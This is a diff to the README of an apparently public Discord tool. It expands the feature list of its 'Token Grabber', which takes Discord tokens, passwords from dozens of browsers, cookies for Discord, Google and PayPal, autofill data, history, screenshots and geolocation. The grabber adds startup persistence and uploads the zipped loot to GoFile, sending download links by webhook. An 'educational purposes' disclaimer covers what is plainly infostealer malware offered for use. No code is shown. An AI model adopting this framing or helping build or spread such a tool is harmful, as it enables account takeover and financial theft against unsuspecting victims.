@@ -30,13 +30,20 @@ A modern, versatile Discord tool packed with powerful features.
 ### Token Grabber
 - **Advanced Token Grabber**
   - Collect Discord tokens from multiple browsers and profiles
-  - Extract browser passwords from 35+ different browsers
+  - Extract browser passwords from 35+ different browsers (Chrome, Edge, Brave, Opera, Vivaldi, Yandex, Firefox)
+  - Capture browser history from all major browsers
+  - Extract autofill data (profiles, form data, addresses)
   - Capture screenshots of user's screens
-  - Gather detailed system information
-  - Extract geolocation data
-  - Collect cookies from important domains
-  - Beautiful formatted output with ASCII art
-  - Configurable Discord webhook reporting
+  - Gather detailed system information and geolocation
+  - Collect cookies from important domains (Discord, Google, PayPal, etc.)
+  - Extract Discord login credentials from local storage
+  - Automatic startup persistence
+  - **NEW: GoFile Integration**
+    - Creates organized local data folders in AppData
+    - Packages all captured data into ZIP archives
+    - Uploads to GoFile for easy download
+    - Clean, formatted text files without failed decryptions
+    - Simple Discord webhook notifications with download links
   - Compile as standalone executable
 
 ### Server Management
@@ -106,17 +113,18 @@ python tts_spammer.py
 ##  Dependencies
 
 The tool requires the following key dependencies:
-- requests, urllib3, discord-webhook
-- colorama, inquirer, art, tqdm
-- pyttsx3
-- psutil, setuptools
-- pycryptodome
-- pillow
-- pywin32, pypiwin32 (Windows only)
-- selenium, webdriver-manager
-- pyinstaller
-- python-dateutil
-- beautifulsoup4
+- **Core Libraries**: requests, urllib3, discord-webhook
+- **UI & Display**: colorama, inquirer, art, tqdm
+- **Audio**: pyttsx3
+- **System**: psutil, setuptools
+- **Cryptography**: pycryptodome
+- **Image Processing**: pillow
+- **Windows Support**: pywin32, pypiwin32 (Windows only)
+- **Browser Automation**: selenium, webdriver-manager
+- **Packaging**: pyinstaller
+- **Date/Time**: python-dateutil
+- **Web Parsing**: beautifulsoup4
+- **File Compression**: zipfile (built-in)
 
 For a complete list, see the requirements.txt file.
 
@@ -125,21 +133,31 @@ For a complete list, see the requirements.txt file.
 - This tool is intended for educational purposes only
 - Please use responsibly and in accordance with Discord's Terms of Service
 - The author is not responsible for any misuse of this tool
+- **Data Security**: All captured data is temporarily stored locally and uploaded to GoFile
+- **Privacy**: Ensure you have proper authorization before using the grabber functionality
+- **Compatibility**: Optimized for Windows systems with support for major browsers
 
 ##  Latest Updates
 
 ### Recent Improvements
+- **Major Token Grabber Overhaul**
+  - Added browser history and autofill data extraction
+  - Implemented GoFile cloud storage integration
+  - Organized data collection into structured ZIP archives
+  - Enhanced data filtering (only valid passwords, no failed decryptions)
+  - Improved local file management with AppData storage
+  - Streamlined Discord notifications with single download links
 - Added advanced Token Grabber with browser password extraction
 - Added Token Generator and Nitro Generator & Checker
 - Added TTS (Text-to-Speech) message support for webhook spammer
-- Enhanced token validation
+- Enhanced token validation and Firefox password support
 - Optimized Nitro days calculation
-- Modernized user interface
-- Improved error handling
+- Modernized user interface with comment-free codebase
+- Improved error handling and startup persistence
 - New webhook deleter feature
 - Extended server cloner functionality
 - Support for multiple screen captures
-- More browser support (35+ browsers)
+- More browser support (35+ browsers including Firefox variants)
 
 ##  Contributing
 
